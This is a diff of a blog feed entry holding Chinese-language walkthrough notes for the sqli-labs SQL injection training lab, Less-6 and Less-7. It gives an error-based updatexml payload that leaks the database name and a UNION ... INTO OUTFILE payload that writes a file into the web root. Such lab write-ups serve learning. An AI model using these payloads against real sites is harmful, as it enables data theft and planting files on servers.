@@ -15,6 +15,24 @@
 <h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>和上一关一样，只不过把单引号变成双引号</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)  and &quot;1</span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>这里用了双括号括起来，如 $sql=”SELECT * FROM users WHERE id=((‘$id’))”  LIMIT 0,1”;</p>
+<p>所以构造语句 ? id =1 ‘ ))  –+  顺利通过验证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;var&#x2F;www&#x2F;sqli-labs&#x2F;Less-7&#x2F;uuu.txt&quot; --+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
 ]]></content>
   </entry>
   <entry>
